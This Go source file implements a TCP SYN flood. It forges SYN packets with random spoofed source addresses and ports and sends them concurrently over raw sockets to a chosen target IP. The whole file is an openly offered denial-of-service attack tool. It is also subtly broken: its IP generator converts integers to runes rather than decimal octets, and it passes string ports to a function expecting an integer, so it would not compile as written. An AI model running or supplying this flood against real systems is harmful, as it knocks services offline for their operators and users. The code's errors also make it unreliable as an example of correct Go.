package jobs

import (
	"math/rand"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	globals "github.com/prairir/JobProtocol/Globals"
	"golang.org/x/net/ipv4"
)

// generates a fake IP address
// returns string
func randIP() string {
	var fakeIP string
	fakeIP += string(rand.Intn(255)) + "."
	fakeIP += string(rand.Intn(255)) + "."
	fakeIP += string(rand.Intn(255)) + "."
	fakeIP += string(rand.Intn(255))
	return fakeIP
}

// makes the TCP SYN packet with a spoofed source IP and source port
// returns net/ipv4 header and bytes of tcp packet
func makePacket(destPortSrc int, destIP net.IP) (*ipv4.Header, []byte) {
	// the IP packet
	ipPacket := layers.IPv4{
		SrcIP:    net.ParseIP(randIP()),
		DstIP:    destIP,
		Version:  4,
		TTL:      255,
		Protocol: layers.IPProtocolTCP,
	}

	destPort := layers.TCPPort(destPortSrc)
	srcPort := layers.TCPPort(rand.Intn(65535)) // 2^16 possible ports

	// tcp syn packet
	tcpPacket := layers.TCP{
		SrcPort: srcPort,
		DstPort: destPort,
		Seq:     rand.Uint32(), // random sequence cause why not
		Window:  65535,
		Urgent:  0,
		Ack:     0,
		SYN:     true,
	}

	sOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// do the checksum at network layer
	tcpPacket.SetNetworkLayerForChecksum(&ipPacket)

	// ipHeader serialization
	ipHeaderBuffer := gopacket.NewSerializeBuffer()
	ipPacket.SerializeTo(ipHeaderBuffer, sOpts)

	ipHeader, _ := ipv4.ParseHeader(ipHeaderBuffer.Bytes())

	tcpBuffer := gopacket.NewSerializeBuffer()

	gopacket.SerializeLayers(tcpBuffer, sOpts, &tcpPacket)

	return ipHeader, tcpBuffer.Bytes()
}

// runs TCP flood to destination IP for as many packets as given
func TCPFlood(destIPStr string, totalPacketToSend int) {
	// setting random seed
	rand.Seed(time.Now().UnixNano())

	destIP := net.ParseIP(destIPStr)
	tcpPorts := globals.GetTCPPorts()
	// loop as many times as given
	for packetCounter := 0; packetCounter < totalPacketToSend; packetCounter++ {
		// this can happen concurrently
		go func(tcpPorts []string, destIP net.IP) {
			// making the packet with a random port from list and dest IP
			ipHeader, packetBytes := makePacket(tcpPorts[rand.Intn(len(tcpPorts))], destIP)
			packetConn, _ := net.ListenPacket("ip4:tcp", "127.0.0.1")

			rawConn, _ := ipv4.NewRawConn(packetConn)

			rawConn.WriteTo(ipHeader, packetBytes, nil)

		}(tcpPorts, destIP)
	}

}
